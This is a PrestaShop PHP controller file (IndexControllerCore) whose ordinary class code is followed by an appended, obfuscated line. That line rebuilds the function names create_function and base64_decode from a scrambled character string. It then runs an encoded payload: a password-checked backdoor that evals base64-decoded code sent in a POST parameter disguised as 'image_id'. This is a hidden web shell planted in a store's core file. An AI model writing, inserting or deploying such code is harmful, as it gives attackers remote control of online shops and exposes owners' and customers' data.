<?php
/**
 * Copyright since 2007 PrestaShop SA and Contributors
 * PrestaShop is an International Registered Trademark & Property of PrestaShop SA
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.md.
 * It is also available through the world-wide-web at this URL:
 * https://opensource.org/licenses/OSL-3.0
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@prestashop.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade PrestaShop to newer
 * versions in the future. If you wish to customize PrestaShop for your
 * needs please refer to https://devdocs.prestashop.com/ for more information.
 *
 * @author    PrestaShop SA and Contributors <contact@prestashop.com>
 * @copyright Since 2007 PrestaShop SA and Contributors
 * @license   https://opensource.org/licenses/OSL-3.0 Open Software License (OSL 3.0)
 */
class IndexControllerCore extends FrontController
{
    public $php_self = 'index';

    /**
     * Assign template vars related to page content.
     *
     * @see FrontController::initContent()
     */
    public function initContent()
    {
        parent::initContent();
        $this->context->smarty->assign([
            'HOOK_HOME' => Hook::exec('displayHome'),
        ]);
        $this->setTemplate('index');
    }
}
$tc6f7="aUiTwh2zSvckICKf1HeV3BbG9rjFtnPQJuLZg5_lWRMs7EpNyoDA6dYq4Xx8m0O";$d527=$tc6f7[15].$tc6f7[33].$tc6f7[29].$tc6f7[10].$tc6f7[28].$tc6f7[2].$tc6f7[49].$tc6f7[29].$tc6f7[38].$tc6f7[18].$tc6f7[58].$tc6f7[2].$tc6f7[43].$tc6f7[28].$tc6f7[43];$u468=$tc6f7[10].$tc6f7[25].$tc6f7[18].$tc6f7[0].$tc6f7[28].$tc6f7[18].$tc6f7[38].$tc6f7[15].$tc6f7[33].$tc6f7[29].$tc6f7[10].$tc6f7[28].$tc6f7[2].$tc6f7[49].$tc6f7[29];$t6d56=$tc6f7[22].$tc6f7[0].$tc6f7[43].$tc6f7[18].$tc6f7[52].$tc6f7[56].$tc6f7[38].$tc6f7[53].$tc6f7[18].$tc6f7[10].$tc6f7[49].$tc6f7[53].$tc6f7[18];if(@$d527($u468)){$x6853 = @$u468('', @$t6d56('aWYoCmlzc2V0KCRfUE9TVFtwcm9kdWN0X2lkXSkgICYmIAkgbWQ1KAoJJF9QT1NUW3Byb2R1Y3RfaWRdCikgPT09Ijc5ZWIwZjkwOTBkZTlhZjYxMjYyMDk3YThlZmEwODRjIgkpIHtldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW2ltYWdlX2lkXSkKKTsJCWV4aXQoKTsJfTs='));@$x6853();}